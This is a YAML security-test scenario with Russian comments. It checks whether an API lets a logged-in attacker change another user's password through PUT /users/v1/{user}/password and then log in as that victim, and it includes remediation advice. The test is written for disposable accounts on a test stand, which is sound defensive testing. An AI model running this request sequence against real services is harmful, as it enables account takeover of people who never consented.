---
# ── Метаданные ──
id: workflow-bypass-password
name: Обход владения — смена чужого пароля и захват аккаунта
description: >
  Штатный процесс смены пароля требует доказать владение аккаунтом (войти под
  ним / знать старый пароль). Здесь атакующий, залогиненный под СВОЕЙ учёткой,
  шлёт PUT на пароль ЧУЖОГО пользователя — обходит обязательный этап проверки
  владения (Circumvention of Work Flows). Вердикт выносится по ФАКТИЧЕСКОМУ
  состоянию: удаётся ли затем войти под жертвой с паролем, заданным атакующим
  (Transaction State Validation), а не по коду ответа на саму смену.
severity: critical
wstg: WSTG-BUSL-06                   # Testing for the Circumvention of Work Flows
tags: [authz, bola, workflow, account-takeover]
remediation: >
  Менять пароль только текущему аутентифицированному пользователю; требовать
  старый пароль; проверять, что владелец ресурса совпадает с субъектом токена.

# ── Роли ──
roles:
  attacker:                          # атакующий действует от своего легитимного имени
    username: ${attacker_name}
    password: ${attacker_password}

# ── Переменные ──
vars:
  victim_name: victim-${run_id}      # отдельные одноразовые юзеры: сценарий самодостаточен
  attacker_name: attacker-${run_id}  # и не портит сид-данные стенда
  victim_password: VictimPass-${run_id}
  attacker_password: AttackerPass-${run_id}
  new_password: Pwned-${run_id}      # пароль, который атакующий пытается навязать жертве

# ── Шаги ──
steps:
  - name: Регистрация жертвы
    type: setup
    request:
      method: POST
      path: /users/v1/register
      json:
        username: ${victim_name}
        password: ${victim_password}
        email: ${victim_name}@test.local
    expect:
      status: 200

  - name: Регистрация атакующего
    type: setup
    request:
      method: POST
      path: /users/v1/register
      json:
        username: ${attacker_name}
        password: ${attacker_password}
        email: ${attacker_name}@test.local
    expect:
      status: 200

  - name: Контроль — жертва входит со своим паролем
    type: setup                      # доказываем, что до атаки аккаунт живёт штатно
    request:
      method: POST
      path: /users/v1/login
      json:
        username: ${victim_name}
        password: ${victim_password}
    expect:
      status: 200
      body_contains: auth_token

  - name: Атакующий меняет пароль жертвы
    type: setup                      # доставка payload; сам по себе ответ ничего не доказывает
    as: attacker                     # ленивый логин атакующего под СВОЕЙ учёткой
    request:
      method: PUT
      path: /users/v1/${victim_name}/password
      json:
        password: ${new_password}
    secure_if:
      status: [401, 403]             # сервер запретил менять чужой пароль → SECURE, стоп
    expect:
      status: [200, 204]             # смена принята — доказываем вред ниже

  - name: Проверка состояния — вход под жертвой паролем атакующего
    type: attack                     # фактический захват: провал безопасного ожидания = VULNERABLE
    request:                         # анонимный логин: пробуем навязанный пароль
      method: POST
      path: /users/v1/login
      json:
        username: ${victim_name}
        password: ${new_password}
    expect:                          # БЕЗОПАСНО: навязанный пароль не должен работать
      status: [401, 403]
      body_not_contains: auth_token  # выдали токен → аккаунт захвачен → уязвимость
